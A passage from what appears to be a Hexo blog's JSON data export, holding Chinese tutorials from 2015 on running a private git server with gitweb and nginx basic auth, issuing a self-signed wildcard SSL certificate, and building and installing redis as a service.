git@MYHOST\ngit@MYHOST's password: \nfatal: Interactive git shell is not enabled.hint: ~/git-shell-commands should exist and have read and execute access.\nConnection to MYHOST closed.</pre>\n\n## web界面\n\n#### 首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\n\ngitweb默认需要在 **/var/www/git** 下放置cgi程序和仓库代码，但我们把仓库安装在了 **/srv/git** 下，所以做个软链接\n<pre># ln -s /srv/git /var/www/git\n# yum install gitweb\n# ls /var/www/git\ngitweb.cgi static PROJECT.git\n</pre>\n可以看到yum安装后多出了这两个: **gitweb.cgi static**\n\n#### 接下来启动gitweb服务\n\n刚才安装的gitweb只是一套动态程序，HTTP访问还要借助lighttpd apache等web服务器．而git自带的命令instaweb可以自动创建web服务器的配置文件．指定--httpd参数为lighttpd即可\n<pre># sudo -i\n# cd /var/www/git\n# git init\n\n# yum install lighttpd\n# git instaweb --httpd=lighttpd --port=1234\nNo known browser available.\nhttp://127.0.0.1:1234\n</pre>\n\n##### 上面的命令解释:\n\n<pre># sudo -i\n# cd /var/www/git</pre>\n因为 /var/www/git 是git用户的home目录，因此普通用户可能没有权限cd，所以需要-i参数保持root权限.\n\n注意：git instaweb 不能指定document root目录，所以在哪个目录下执行，就展示那个目录下的仓库．因而需要先**cd**到这里\n<pre># git init</pre>\ngit instaweb创建的web服务器配置文件，需要一个git仓库来存放．\n\n#### 外界访问控制\n\n到这里就可以访问git仓库了，但没有完，还需要外界可以访问，并且要限制访问．这时可以借助nginx，或者修改lighttpd的配置文件\n<pre>server {\n    listen 80;\n    server_name git.MYHOST.COM\n    location / {\n        auth_basic \"git web require auth\";\n        auth_basic_user_file /srv/etc/passwd;\n        proxy_pass http://127.0.0.1:1234/;\n    }\n}\n</pre>\n有关auth_basic的配置可以参阅 [http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html](http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html)\n\n#### 大功告成\n\n到这一步就结束了，现在访问 http://git.MYHOST.COM/ 即可浏览仓库信息\n\n如果你觉得这个web界面太丑陋的话，可以看看 [https://github.com/kogakure/gitweb-theme](https://github.com/kogakure/gitweb-theme) ，这个项目提供了更优雅的主题界面：[http://kogakure.github.io/gitweb-theme/](http://kogakure.github.io/gitweb-theme/)","source":"_posts/e6-90-ad-e5-bb-ba-e8-87-aa-e5-b7-b1-e7-9a-84git-e6-9c-8d-e5-8a-a1-e5-99-a8.md","raw":"---\ntitle: 搭建自己的git服务器\nid: 70\ncategories:\n  - linux\ndate: 2015-06-07 01:46:57\ntags:\n---\n\ngithub私有仓库的费用太贵，有VPS可以自己搭建一个专属git服务器\n\n其实没什么需要安装的，git的默认协议SSH不需要什么配置，主要是方便和安全方面的优化\n\n## 初始化环境\n\n为了安全，我们为git仓库专门设置一个管理用户**git**，约定使用 **/srv/git **放置仓库\n<pre>$ sudo useradd \\\n--create-home \\\n--home-dir=/srv/git \\\n--root=/srv/git \\\n--base-dir=/srv/git \\\n--shell=/usr/bin/git-shell \\\ngit\n$ sudo passwd git</pre>\n\n### 上面的参数作用\n\n<pre>--create-home --home-dir=/srv/git</pre>\n创建用户主目录，将来可以添加SSH KEY登录方式，和代码仓库放在一起方便管理\n<pre>--root=/srv/git</pre>\n限制这个用户的访问目录在/srv/git，不能访问其它路径，这是出于安全考虑\n<pre>--base-dir=/srv/git</pre>\n用户base目录，即默认的父目录．帮助简化了克隆时的目录前缀\n<pre>--shell=/usr/bin/git-shell</pre>\n只允许用户用于管理仓库，不得执行其它命令\n\n## 创建仓库\n\n初始化一个裸仓库，即只包含仓库信息，不包含代码\n<pre>$ sudo git --bare init /srv/git/MY_PROJECT.git</pre>\n不需要其它配置了，就这么简单\n\n## 从客户端克隆\n\nMYHOST就是VPS的主机地址\n<pre>$ git clone git@MYHOST:MY_PROJECT.git</pre>\n\n#### 主机名后的目录只需要填写仓库目录\n\n这是创建用户时指定的 **--base-dir** 立的功，让你不用输入完整的目录 **/srv/git/MY_PROJECT.git**\n\n#### 尝试用git用户登录会被阻止\n\n<pre>$ ssh git@MYHOST\ngit@MYHOST's password: \nfatal: Interactive git shell is not enabled.hint: ~/git-shell-commands should exist and have read and execute access.\nConnection to MYHOST closed.</pre>\n\n## web界面\n\n#### 首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\n\ngitweb默认需要在 **/var/www/git** 下放置cgi程序和仓库代码，但我们把仓库安装在了 **/srv/git** 下，所以做个软链接\n<pre># ln -s /srv/git /var/www/git\n# yum install gitweb\n# ls /var/www/git\ngitweb.cgi static PROJECT.git\n</pre>\n可以看到yum安装后多出了这两个: **gitweb.cgi static**\n\n#### 接下来启动gitweb服务\n\n刚才安装的gitweb只是一套动态程序，HTTP访问还要借助lighttpd apache等web服务器．而git自带的命令instaweb可以自动创建web服务器的配置文件．指定--httpd参数为lighttpd即可\n<pre># sudo -i\n# cd /var/www/git\n# git init\n\n# yum install lighttpd\n# git instaweb --httpd=lighttpd --port=1234\nNo known browser available.\nhttp://127.0.0.1:1234\n</pre>\n\n##### 上面的命令解释:\n\n<pre># sudo -i\n# cd /var/www/git</pre>\n因为 /var/www/git 是git用户的home目录，因此普通用户可能没有权限cd，所以需要-i参数保持root权限.\n\n注意：git instaweb 不能指定document root目录，所以在哪个目录下执行，就展示那个目录下的仓库．因而需要先**cd**到这里\n<pre># git init</pre>\ngit instaweb创建的web服务器配置文件，需要一个git仓库来存放．\n\n#### 外界访问控制\n\n到这里就可以访问git仓库了，但没有完，还需要外界可以访问，并且要限制访问．这时可以借助nginx，或者修改lighttpd的配置文件\n<pre>server {\n    listen 80;\n    server_name git.MYHOST.COM\n    location / {\n        auth_basic \"git web require auth\";\n        auth_basic_user_file /srv/etc/passwd;\n        proxy_pass http://127.0.0.1:1234/;\n    }\n}\n</pre>\n有关auth_basic的配置可以参阅 [http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html](http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html)\n\n#### 大功告成\n\n到这一步就结束了，现在访问 http://git.MYHOST.COM/ 即可浏览仓库信息\n\n如果你觉得这个web界面太丑陋的话，可以看看 [https://github.com/kogakure/gitweb-theme](https://github.com/kogakure/gitweb-theme) ，这个项目提供了更优雅的主题界面：[http://kogakure.github.io/gitweb-theme/](http://kogakure.github.io/gitweb-theme/)","slug":"e6-90-ad-e5-bb-ba-e8-87-aa-e5-b7-b1-e7-9a-84git-e6-9c-8d-e5-8a-a1-e5-99-a8","published":1,"updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cil100g9gmlmzp3cv7tt","content":"<p>github私有仓库的费用太贵，有VPS可以自己搭建一个专属git服务器</p>\n<p>其实没什么需要安装的，git的默认协议SSH不需要什么配置，主要是方便和安全方面的优化</p>\n<h2 id=\"初始化环境\"><a href=\"#初始化环境\" class=\"headerlink\" title=\"初始化环境\"></a>初始化环境</h2><p>为了安全，我们为git仓库专门设置一个管理用户<strong>git</strong>，约定使用 <strong>/srv/git </strong>放置仓库</p>\n<pre>$ sudo useradd \\\n--create-home \\\n--home-dir=/srv/git \\\n--root=/srv/git \\\n--base-dir=/srv/git \\\n--shell=/usr/bin/git-shell \\\ngit\n$ sudo passwd git</pre>\n\n<h3 id=\"上面的参数作用\"><a href=\"#上面的参数作用\" class=\"headerlink\" title=\"上面的参数作用\"></a>上面的参数作用</h3><pre>--create-home --home-dir=/srv/git</pre>\n创建用户主目录，将来可以添加SSH KEY登录方式，和代码仓库放在一起方便管理\n<pre>--root=/srv/git</pre>\n限制这个用户的访问目录在/srv/git，不能访问其它路径，这是出于安全考虑\n<pre>--base-dir=/srv/git</pre>\n用户base目录，即默认的父目录．帮助简化了克隆时的目录前缀\n<pre>--shell=/usr/bin/git-shell</pre>\n只允许用户用于管理仓库，不得执行其它命令\n\n## 创建仓库\n\n初始化一个裸仓库，即只包含仓库信息，不包含代码\n<pre>$ sudo git --bare init /srv/git/MY_PROJECT.git</pre>\n不需要其它配置了，就这么简单\n\n## 从客户端克隆\n\nMYHOST就是VPS的主机地址\n<pre>$ git clone git@MYHOST:MY_PROJECT.git</pre>\n\n<h4 id=\"主机名后的目录只需要填写仓库目录\"><a href=\"#主机名后的目录只需要填写仓库目录\" class=\"headerlink\" title=\"主机名后的目录只需要填写仓库目录\"></a>主机名后的目录只需要填写仓库目录</h4><p>这是创建用户时指定的 <strong>–base-dir</strong> 立的功，让你不用输入完整的目录 <strong>/srv/git/MY_PROJECT.git</strong></p>\n<h4 id=\"尝试用git用户登录会被阻止\"><a href=\"#尝试用git用户登录会被阻止\" class=\"headerlink\" title=\"尝试用git用户登录会被阻止\"></a>尝试用git用户登录会被阻止</h4><pre>$ ssh git@MYHOST\ngit@MYHOST's password: \nfatal: Interactive git shell is not enabled.hint: ~/git-shell-commands should exist and have read and execute access.\nConnection to MYHOST closed.</pre>\n\n<h2 id=\"web界面\"><a href=\"#web界面\" class=\"headerlink\" title=\"web界面\"></a>web界面</h2><h4 id=\"首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\"><a href=\"#首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\" class=\"headerlink\" title=\"首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\"></a>首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．</h4><p>gitweb默认需要在 <strong>/var/www/git</strong> 下放置cgi程序和仓库代码，但我们把仓库安装在了 <strong>/srv/git</strong> 下，所以做个软链接</p>\n<pre># ln -s /srv/git /var/www/git\n# yum install gitweb\n# ls /var/www/git\ngitweb.cgi static PROJECT.git\n</pre>\n可以看到yum安装后多出了这两个: **gitweb.cgi static**\n\n#### 接下来启动gitweb服务\n\n刚才安装的gitweb只是一套动态程序，HTTP访问还要借助lighttpd apache等web服务器．而git自带的命令instaweb可以自动创建web服务器的配置文件．指定--httpd参数为lighttpd即可\n<pre># sudo -i\n# cd /var/www/git\n# git init\n\n# yum install lighttpd\n# git instaweb --httpd=lighttpd --port=1234\nNo known browser available.\nhttp://127.0.0.1:1234\n</pre>\n\n<h5 id=\"上面的命令解释\"><a href=\"#上面的命令解释\" class=\"headerlink\" title=\"上面的命令解释:\"></a>上面的命令解释:</h5><p><pre># sudo -i</pre></p>\n<h1 id=\"cd-var-www-git\"><a href=\"#cd-var-www-git\" class=\"headerlink\" title=\"cd /var/www/git\"></a>cd /var/www/git</h1><p>因为 /var/www/git 是git用户的home目录，因此普通用户可能没有权限cd，所以需要-i参数保持root权限.</p>\n<p>注意：git instaweb 不能指定document root目录，所以在哪个目录下执行，就展示那个目录下的仓库．因而需要先<strong>cd</strong>到这里</p>\n<p><pre># git init</pre><br>git instaweb创建的web服务器配置文件，需要一个git仓库来存放．</p>\n<h4 id=\"外界访问控制\"><a href=\"#外界访问控制\" class=\"headerlink\" title=\"外界访问控制\"></a>外界访问控制</h4><p>到这里就可以访问git仓库了，但没有完，还需要外界可以访问，并且要限制访问．这时可以借助nginx，或者修改lighttpd的配置文件</p>\n<p><pre>server {<br>    listen 80;<br>    server_name git.MYHOST.COM<br>    location / {<br>        auth_basic “git web require auth”;<br>        auth_basic_user_file /srv/etc/passwd;<br>        proxy_pass <a href=\"http://127.0.0.1:1234/\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:1234/</a>;<br>    }<br>}<br></pre><br>有关auth_basic的配置可以参阅 <a href=\"http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html\" target=\"_blank\" rel=\"noopener\">http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html</a></p>\n<h4 id=\"大功告成\"><a href=\"#大功告成\" class=\"headerlink\" title=\"大功告成\"></a>大功告成</h4><p>到这一步就结束了，现在访问 <a href=\"http://git.MYHOST.COM/\" target=\"_blank\" rel=\"noopener\">http://git.MYHOST.COM/</a> 即可浏览仓库信息</p>\n<p>如果你觉得这个web界面太丑陋的话，可以看看 <a href=\"https://github.com/kogakure/gitweb-theme\" target=\"_blank\" rel=\"noopener\">https://github.com/kogakure/gitweb-theme</a> ，这个项目提供了更优雅的主题界面：<a href=\"http://kogakure.github.io/gitweb-theme/\" target=\"_blank\" rel=\"noopener\">http://kogakure.github.io/gitweb-theme/</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>github私有仓库的费用太贵，有VPS可以自己搭建一个专属git服务器</p>\n<p>其实没什么需要安装的，git的默认协议SSH不需要什么配置，主要是方便和安全方面的优化</p>\n<h2 id=\"初始化环境\"><a href=\"#初始化环境\" class=\"headerlink\" title=\"初始化环境\"></a>初始化环境</h2><p>为了安全，我们为git仓库专门设置一个管理用户<strong>git</strong>，约定使用 <strong>/srv/git </strong>放置仓库</p>\n<pre>$ sudo useradd \\\n--create-home \\\n--home-dir=/srv/git \\\n--root=/srv/git \\\n--base-dir=/srv/git \\\n--shell=/usr/bin/git-shell \\\ngit\n$ sudo passwd git</pre>\n\n<h3 id=\"上面的参数作用\"><a href=\"#上面的参数作用\" class=\"headerlink\" title=\"上面的参数作用\"></a>上面的参数作用</h3><pre>--create-home --home-dir=/srv/git</pre>\n创建用户主目录，将来可以添加SSH KEY登录方式，和代码仓库放在一起方便管理\n<pre>--root=/srv/git</pre>\n限制这个用户的访问目录在/srv/git，不能访问其它路径，这是出于安全考虑\n<pre>--base-dir=/srv/git</pre>\n用户base目录，即默认的父目录．帮助简化了克隆时的目录前缀\n<pre>--shell=/usr/bin/git-shell</pre>\n只允许用户用于管理仓库，不得执行其它命令\n\n## 创建仓库\n\n初始化一个裸仓库，即只包含仓库信息，不包含代码\n<pre>$ sudo git --bare init /srv/git/MY_PROJECT.git</pre>\n不需要其它配置了，就这么简单\n\n## 从客户端克隆\n\nMYHOST就是VPS的主机地址\n<pre>$ git clone git@MYHOST:MY_PROJECT.git</pre>\n\n<h4 id=\"主机名后的目录只需要填写仓库目录\"><a href=\"#主机名后的目录只需要填写仓库目录\" class=\"headerlink\" title=\"主机名后的目录只需要填写仓库目录\"></a>主机名后的目录只需要填写仓库目录</h4><p>这是创建用户时指定的 <strong>–base-dir</strong> 立的功，让你不用输入完整的目录 <strong>/srv/git/MY_PROJECT.git</strong></p>\n<h4 id=\"尝试用git用户登录会被阻止\"><a href=\"#尝试用git用户登录会被阻止\" class=\"headerlink\" title=\"尝试用git用户登录会被阻止\"></a>尝试用git用户登录会被阻止</h4><pre>$ ssh git@MYHOST\ngit@MYHOST's password: \nfatal: Interactive git shell is not enabled.hint: ~/git-shell-commands should exist and have read and execute access.\nConnection to MYHOST closed.</pre>\n\n<h2 id=\"web界面\"><a href=\"#web界面\" class=\"headerlink\" title=\"web界面\"></a>web界面</h2><h4 id=\"首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\"><a href=\"#首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\" class=\"headerlink\" title=\"首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\"></a>首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．</h4><p>gitweb默认需要在 <strong>/var/www/git</strong> 下放置cgi程序和仓库代码，但我们把仓库安装在了 <strong>/srv/git</strong> 下，所以做个软链接</p>\n<pre># ln -s /srv/git /var/www/git\n# yum install gitweb\n# ls /var/www/git\ngitweb.cgi static PROJECT.git\n</pre>\n可以看到yum安装后多出了这两个: **gitweb.cgi static**\n\n#### 接下来启动gitweb服务\n\n刚才安装的gitweb只是一套动态程序，HTTP访问还要借助lighttpd apache等web服务器．而git自带的命令instaweb可以自动创建web服务器的配置文件．指定--httpd参数为lighttpd即可\n<pre># sudo -i\n# cd /var/www/git\n# git init\n\n# yum install lighttpd\n# git instaweb --httpd=lighttpd --port=1234\nNo known browser available.\nhttp://127.0.0.1:1234\n</pre>\n\n<h5 id=\"上面的命令解释\"><a href=\"#上面的命令解释\" class=\"headerlink\" title=\"上面的命令解释:\"></a>上面的命令解释:</h5><p><pre># sudo -i</pre></p>\n<h1 id=\"cd-var-www-git\"><a href=\"#cd-var-www-git\" class=\"headerlink\" title=\"cd /var/www/git\"></a>cd /var/www/git</h1><p>因为 /var/www/git 是git用户的home目录，因此普通用户可能没有权限cd，所以需要-i参数保持root权限.</p>\n<p>注意：git instaweb 不能指定document root目录，所以在哪个目录下执行，就展示那个目录下的仓库．因而需要先<strong>cd</strong>到这里</p>\n<p><pre># git init</pre><br>git instaweb创建的web服务器配置文件，需要一个git仓库来存放．</p>\n<h4 id=\"外界访问控制\"><a href=\"#外界访问控制\" class=\"headerlink\" title=\"外界访问控制\"></a>外界访问控制</h4><p>到这里就可以访问git仓库了，但没有完，还需要外界可以访问，并且要限制访问．这时可以借助nginx，或者修改lighttpd的配置文件</p>\n<p><pre>server {<br>    listen 80;<br>    server_name git.MYHOST.COM<br>    location / {<br>        auth_basic “git web require auth”;<br>        auth_basic_user_file /srv/etc/passwd;<br>        proxy_pass <a href=\"http://127.0.0.1:1234/\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:1234/</a>;<br>    }<br>}<br></pre><br>有关auth_basic的配置可以参阅 <a href=\"http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html\" target=\"_blank\" rel=\"noopener\">http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html</a></p>\n<h4 id=\"大功告成\"><a href=\"#大功告成\" class=\"headerlink\" title=\"大功告成\"></a>大功告成</h4><p>到这一步就结束了，现在访问 <a href=\"http://git.MYHOST.COM/\" target=\"_blank\" rel=\"noopener\">http://git.MYHOST.COM/</a> 即可浏览仓库信息</p>\n<p>如果你觉得这个web界面太丑陋的话，可以看看 <a href=\"https://github.com/kogakure/gitweb-theme\" target=\"_blank\" rel=\"noopener\">https://github.com/kogakure/gitweb-theme</a> ，这个项目提供了更优雅的主题界面：<a href=\"http://kogakure.github.io/gitweb-theme/\" target=\"_blank\" rel=\"noopener\">http://kogakure.github.io/gitweb-theme/</a></p>\n"},{"title":"自签名通配符SSL证书","id":"82","date":"2015-06-14T14:51:30.000Z","_content":"\n通配符的证书 ***.example.com** 没有免费的，看了一圈最便宜的得300块/年．不如自己用openssl签发，然后手工导入到系统的信任列表里，只是麻烦点而已．\n\n## 创建证书\n\n创建根证书私匙，这里的2048也可以是4096更安全\n<pre>openssl genrsa -out root.key 2048</pre>\n创建根证书公钥\n<pre>openssl req -new -key root.key -out root.csr</pre>\n创建独立的证书配置，也就是通配符域名的设置，如果想指定更多域名，可以用逗号分隔 subjectAltName=DNS:*.xiaoai.me**,DNS:*.site2.com**\n<pre>echo \"subjectAltName=DNS:*.xiaoai.me\" &gt; cert_extensions</pre>\n创建web服务器使用的CA证书\n<pre>openssl x509 -req -sha512 -in root.csr -signkey root.key -extfile cert_extensions -out server.crt -days 1095</pre>\n这里会询问一些参数，比如签发者的组织名，可以随便填都行\n\n#### 参数作用\n\n**-sha512 **加密算法，sha512是目前最安全的了，而最普遍的sha1已经开始被逐渐废弃\n\n**-days 1095  **证书有效期3年\n\n**-extfile cert_extensions **包含刚才创建的通配符配置\n\n**-out server.crt** 创建服务器使用的CA证书\n\n## 配置证书\n\n#### nginx 主机\n\n<pre>listen 443 ssl;\nserver_name ssl1.xiaoai.me;\n</pre>\n\n#### 证书配置\n\n<pre>ssl_certificate server.crt;\nssl_certificate_key root.key;\n</pre>\n\n#### 缓存优化\n\n<pre>ssl_session_cache shared:SSL:10m;\nssl_session_timeout 10m;</pre>\n\n## 信任证书\n\n现在访问 https://ssl1.xiaoai.me 会提示证书错误，需要将证书安装在系统信任根证书列表里．\n\n#### 导出网站证书\n\n从浏览器的查看证书选项里，导出证书．一般为 **.cer 格式 **文件\n\n#### 导入到根证书列表里\n\n在开始菜单中运行 **certmgr.msc** 打开证书管理器，在 **受信任的根证书颁发机构 **，右键选择导入刚才的**.cer**格式文件，最终确定信任即可．\n\n最后需要重启下浏览器才能生效，接下来就可以看到纯绿色的https图标了","source":"_posts/e8-87-aa-e7-ad-be-e5-90-8d-e9-80-9a-e9-85-8d-e7-ac-a6ssl-e8-af-81-e4-b9-a6.md","raw":"---\ntitle: 自签名通配符SSL证书\nid: 82\ncategories:\n  - linux\ndate: 2015-06-14 22:51:30\ntags:\n---\n\n通配符的证书 ***.example.com** 没有免费的，看了一圈最便宜的得300块/年．不如自己用openssl签发，然后手工导入到系统的信任列表里，只是麻烦点而已．\n\n## 创建证书\n\n创建根证书私匙，这里的2048也可以是4096更安全\n<pre>openssl genrsa -out root.key 2048</pre>\n创建根证书公钥\n<pre>openssl req -new -key root.key -out root.csr</pre>\n创建独立的证书配置，也就是通配符域名的设置，如果想指定更多域名，可以用逗号分隔 subjectAltName=DNS:*.xiaoai.me**,DNS:*.site2.com**\n<pre>echo \"subjectAltName=DNS:*.xiaoai.me\" &gt; cert_extensions</pre>\n创建web服务器使用的CA证书\n<pre>openssl x509 -req -sha512 -in root.csr -signkey root.key -extfile cert_extensions -out server.crt -days 1095</pre>\n这里会询问一些参数，比如签发者的组织名，可以随便填都行\n\n#### 参数作用\n\n**-sha512 **加密算法，sha512是目前最安全的了，而最普遍的sha1已经开始被逐渐废弃\n\n**-days 1095  **证书有效期3年\n\n**-extfile cert_extensions **包含刚才创建的通配符配置\n\n**-out server.crt** 创建服务器使用的CA证书\n\n## 配置证书\n\n#### nginx 主机\n\n<pre>listen 443 ssl;\nserver_name ssl1.xiaoai.me;\n</pre>\n\n#### 证书配置\n\n<pre>ssl_certificate server.crt;\nssl_certificate_key root.key;\n</pre>\n\n#### 缓存优化\n\n<pre>ssl_session_cache shared:SSL:10m;\nssl_session_timeout 10m;</pre>\n\n## 信任证书\n\n现在访问 https://ssl1.xiaoai.me 会提示证书错误，需要将证书安装在系统信任根证书列表里．\n\n#### 导出网站证书\n\n从浏览器的查看证书选项里，导出证书．一般为 **.cer 格式 **文件\n\n#### 导入到根证书列表里\n\n在开始菜单中运行 **certmgr.msc** 打开证书管理器，在 **受信任的根证书颁发机构 **，右键选择导入刚才的**.cer**格式文件，最终确定信任即可．\n\n最后需要重启下浏览器才能生效，接下来就可以看到纯绿色的https图标了","slug":"e8-87-aa-e7-ad-be-e5-90-8d-e9-80-9a-e9-85-8d-e7-ac-a6ssl-e8-af-81-e4-b9-a6","published":1,"updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cil200gbgmlmmp660p1q","content":"<p>通配符的证书 <strong>*.example.com</strong> 没有免费的，看了一圈最便宜的得300块/年．不如自己用openssl签发，然后手工导入到系统的信任列表里，只是麻烦点而已．</p>\n<h2 id=\"创建证书\"><a href=\"#创建证书\" class=\"headerlink\" title=\"创建证书\"></a>创建证书</h2><p>创建根证书私匙，这里的2048也可以是4096更安全</p>\n<pre>openssl genrsa -out root.key 2048</pre>\n创建根证书公钥\n<pre>openssl req -new -key root.key -out root.csr</pre>\n创建独立的证书配置，也就是通配符域名的设置，如果想指定更多域名，可以用逗号分隔 subjectAltName=DNS:*.xiaoai.me**,DNS:*.site2.com**\n<pre>echo \"subjectAltName=DNS:*.xiaoai.me\" &gt; cert_extensions</pre>\n创建web服务器使用的CA证书\n<pre>openssl x509 -req -sha512 -in root.csr -signkey root.key -extfile cert_extensions -out server.crt -days 1095</pre>\n这里会询问一些参数，比如签发者的组织名，可以随便填都行\n\n#### 参数作用\n\n**-sha512 **加密算法，sha512是目前最安全的了，而最普遍的sha1已经开始被逐渐废弃\n\n**-days 1095  **证书有效期3年\n\n**-extfile cert_extensions **包含刚才创建的通配符配置\n\n**-out server.crt** 创建服务器使用的CA证书\n\n## 配置证书\n\n#### nginx 主机\n\n<pre>listen 443 ssl;\nserver_name ssl1.xiaoai.me;\n</pre>\n\n<h4 id=\"证书配置\"><a href=\"#证书配置\" class=\"headerlink\" title=\"证书配置\"></a>证书配置</h4><pre>ssl_certificate server.crt;\nssl_certificate_key root.key;\n</pre>\n\n<h4 id=\"缓存优化\"><a href=\"#缓存优化\" class=\"headerlink\" title=\"缓存优化\"></a>缓存优化</h4><pre>ssl_session_cache shared:SSL:10m;\nssl_session_timeout 10m;</pre>\n\n<h2 id=\"信任证书\"><a href=\"#信任证书\" class=\"headerlink\" title=\"信任证书\"></a>信任证书</h2><p>现在访问 <a href=\"https://ssl1.xiaoai.me\" target=\"_blank\" rel=\"noopener\">https://ssl1.xiaoai.me</a> 会提示证书错误，需要将证书安装在系统信任根证书列表里．</p>\n<h4 id=\"导出网站证书\"><a href=\"#导出网站证书\" class=\"headerlink\" title=\"导出网站证书\"></a>导出网站证书</h4><p>从浏览器的查看证书选项里，导出证书．一般为 <strong>.cer 格式 </strong>文件</p>\n<h4 id=\"导入到根证书列表里\"><a href=\"#导入到根证书列表里\" class=\"headerlink\" title=\"导入到根证书列表里\"></a>导入到根证书列表里</h4><p>在开始菜单中运行 <strong>certmgr.msc</strong> 打开证书管理器，在 <strong>受信任的根证书颁发机构 </strong>，右键选择导入刚才的<strong>.cer</strong>格式文件，最终确定信任即可．</p>\n<p>最后需要重启下浏览器才能生效，接下来就可以看到纯绿色的https图标了</p>\n","site":{"data":{}},"excerpt":"","more":"<p>通配符的证书 <strong>*.example.com</strong> 没有免费的，看了一圈最便宜的得300块/年．不如自己用openssl签发，然后手工导入到系统的信任列表里，只是麻烦点而已．</p>\n<h2 id=\"创建证书\"><a href=\"#创建证书\" class=\"headerlink\" title=\"创建证书\"></a>创建证书</h2><p>创建根证书私匙，这里的2048也可以是4096更安全</p>\n<pre>openssl genrsa -out root.key 2048</pre>\n创建根证书公钥\n<pre>openssl req -new -key root.key -out root.csr</pre>\n创建独立的证书配置，也就是通配符域名的设置，如果想指定更多域名，可以用逗号分隔 subjectAltName=DNS:*.xiaoai.me**,DNS:*.site2.com**\n<pre>echo \"subjectAltName=DNS:*.xiaoai.me\" &gt; cert_extensions</pre>\n创建web服务器使用的CA证书\n<pre>openssl x509 -req -sha512 -in root.csr -signkey root.key -extfile cert_extensions -out server.crt -days 1095</pre>\n这里会询问一些参数，比如签发者的组织名，可以随便填都行\n\n#### 参数作用\n\n**-sha512 **加密算法，sha512是目前最安全的了，而最普遍的sha1已经开始被逐渐废弃\n\n**-days 1095  **证书有效期3年\n\n**-extfile cert_extensions **包含刚才创建的通配符配置\n\n**-out server.crt** 创建服务器使用的CA证书\n\n## 配置证书\n\n#### nginx 主机\n\n<pre>listen 443 ssl;\nserver_name ssl1.xiaoai.me;\n</pre>\n\n<h4 id=\"证书配置\"><a href=\"#证书配置\" class=\"headerlink\" title=\"证书配置\"></a>证书配置</h4><pre>ssl_certificate server.crt;\nssl_certificate_key root.key;\n</pre>\n\n<h4 id=\"缓存优化\"><a href=\"#缓存优化\" class=\"headerlink\" title=\"缓存优化\"></a>缓存优化</h4><pre>ssl_session_cache shared:SSL:10m;\nssl_session_timeout 10m;</pre>\n\n<h2 id=\"信任证书\"><a href=\"#信任证书\" class=\"headerlink\" title=\"信任证书\"></a>信任证书</h2><p>现在访问 <a href=\"https://ssl1.xiaoai.me\" target=\"_blank\" rel=\"noopener\">https://ssl1.xiaoai.me</a> 会提示证书错误，需要将证书安装在系统信任根证书列表里．</p>\n<h4 id=\"导出网站证书\"><a href=\"#导出网站证书\" class=\"headerlink\" title=\"导出网站证书\"></a>导出网站证书</h4><p>从浏览器的查看证书选项里，导出证书．一般为 <strong>.cer 格式 </strong>文件</p>\n<h4 id=\"导入到根证书列表里\"><a href=\"#导入到根证书列表里\" class=\"headerlink\" title=\"导入到根证书列表里\"></a>导入到根证书列表里</h4><p>在开始菜单中运行 <strong>certmgr.msc</strong> 打开证书管理器，在 <strong>受信任的根证书颁发机构 </strong>，右键选择导入刚才的<strong>.cer</strong>格式文件，最终确定信任即可．</p>\n<p>最后需要重启下浏览器才能生效，接下来就可以看到纯绿色的https图标了</p>\n"},{"title":"redis安装笔记","id":"75","date":"2015-06-09T17:22:49.000Z","_content":"\n## 安装\n\n安装前约定以 **/srv/server/redis** 来放置编译后的可执行文件\n\n下载解压最新版开发包，因为本身是开发用的，所以装个**unstable**玩玩\n<pre>$ wget https://github.com/antirez/redis/archive/unstable.tar.gz\n$ tar -zxf unstable.tar.gz\n$ cp -R redis-unstable /srv/server/redis\n</pre>\nredis本身小巧，不需要特别的依赖关系，所以省去了**./configure**这一步，在哪**make**就安装在哪\n<pre>$ cd /srv/server/redis\n$ sudo make\n$ sudo make install</pre>\n一般都不会遇到错误，因为它没有过多的依赖问题\n\n安装完成，在**./src**目录下就有编译好的可执行文件．另外安装程序还会在**/usr/local/bin**也放置一份可执行文件，因而可以直接运行 **$ redis-cli**\n\n## 优化点\n\n将redis-server作为init.d/service管理会方便很多，而redis也自带了启动脚本\n\n### 首先复制文件到预定位置\n\n<pre>$ sudo cp ./utils/redis_init_script /etc/init.d/redis\n$ sudo mkdir /etc/redis\n$ sudo cp ./redis.conf /etc/redis/6379.conf</pre>\n\n### 在后台运行\n\nredis默认在当前进程直接运行，因此每回启动都需要用nohup，比较繁琐．可以改下它的配置文件解决\n<pre>$ sudo vi /etc/redis/6379.conf\n- daemonize no\n+ daemonize yes</pre>\n\n### 启动控制\n\nredis的启动脚本和配置文件定义的pid位置还有差别\n<pre>$ sudo vi /etc/redis/6379.conf\n- pidfile /var/run/redis.pid\n+ pidfile /var/run/redis_6379.pid\n$ sudo service redis start\nStarting Redis server...\n$ sudo service redis stop\nStopping ...\nRedis stopped</pre>\n\n### 开机启动\n\nredis的启动文件不支持**chkconfig**配置，需要在开头加两行启动配置\n\n    <span class=\"com\">$ sudo vi /etc/init.d/redis\n    &lt;&lt;&lt;++\n    # chkconfig: 2345 90 60\n    # description start redis server on boot\n    &gt;&gt;&gt;\n    $ sudo chkconfig redis on</span>\n\n大功告成\n\n## 